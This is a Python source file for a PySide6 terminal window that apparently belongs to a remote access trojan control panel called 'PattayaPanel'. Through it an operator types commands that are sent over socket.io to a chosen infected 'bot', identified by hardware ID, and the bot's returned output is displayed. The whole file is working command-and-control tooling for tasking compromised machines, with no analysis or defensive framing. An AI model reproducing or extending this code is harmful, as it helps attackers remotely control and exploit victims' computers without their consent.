from PySide6.QtWidgets import QWidget,QCompleter
from PySide6.QtGui import QIcon,QFont
from PySide6.QtCore import Qt
from core.util import PattayaPanelUtil
from designer.ui_terminal import Ui_BotTerminalWidget
import json
from datetime import datetime


class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
    def __init__(self, bot, socket_io_client):
        super().__init__()        
        self.setupUi(self)
        self.bot = bot
        self.socket_io_client = socket_io_client
        self.setWindowIcon(QIcon(":/assets/images/rat.png"))
        self.task_result_text_browser.setStyleSheet("background-color: #000000;")
        self.bot_send_task_line_edit.setStyleSheet("background-color: #000000;")
        self.bot_send_task_line_edit.setStyleSheet("color: #FB00FF;")


        # command = ['help', 'cd', 'pwd', 'mkdir', 'start']
        # completer = QCompleter(command)
        # self.bot_send_task_line_edit.setCompleter(completer)

        self.setWindowFlags(Qt.WindowType.WindowStaysOnTopHint)
        self.bot_send_task_line_edit.returnPressed.connect(self.handle_bot_comamnd)

        self.bot_event = f'panel_terminal_bot_task_result_{self.bot["hwid"]}'

        font = QFont()
        font.setPointSize(11)  # set the font size to 20
        self.task_result_text_browser.setFont(font)

        self.socket_io_client.socket_io.on(self.bot_event, self.server_update_bot_terminal)
    

    def handle_bot_comamnd(self):
        text = self.bot_send_task_line_edit.text()
        if text == '':
            return
        
        PattayaPanelUtil.panel_log_info(f"Enter {text} command")
        self.update_bot_terminal(text)
        args = text.split(" ", 1)
        command = args[0]

        if (len(args)) == 1:
            arg = ""
        else:
            arg = args[1]

        bot_task = {
            "socketId": self.bot['socketId'],
            "hwid": self.bot['hwid'],
            "command": command,
            "arguments": arg,
            "file": "" 
        }
        json_object = json.dumps(bot_task)
        self.socket_io_client.socket_io.emit('panel_send_bot_task', json_object)
        self.bot_send_task_line_edit.clear()


    def closeEvent(self, event):
        # self.socket_io_client.socket_io.off(self.bot_event)
        PattayaPanelUtil.terminals.pop(self.bot['hwid'])
        PattayaPanelUtil.panel_log_info(f"Closed {self.bot['username']} terminal")
    
    
    def server_update_bot_terminal(self, text):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        self.task_result_text_browser.append(f"<font color='#F600FA'>[*] [{formatted_time}] {text['message']}</font><br>")
        self.task_result_text_browser.ensureCursorVisible()

    def update_bot_terminal(self, command):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        self.task_result_text_browser.append(f"<font color='#2AFA00'>[+] [{formatted_time}] Tasking bot [{self.bot['username']}]</font><font color='#F6FA00'>>>></font></font><font color='#00E3FA'> {command}</font>")
        self.task_result_text_browser.ensureCursorVisible()


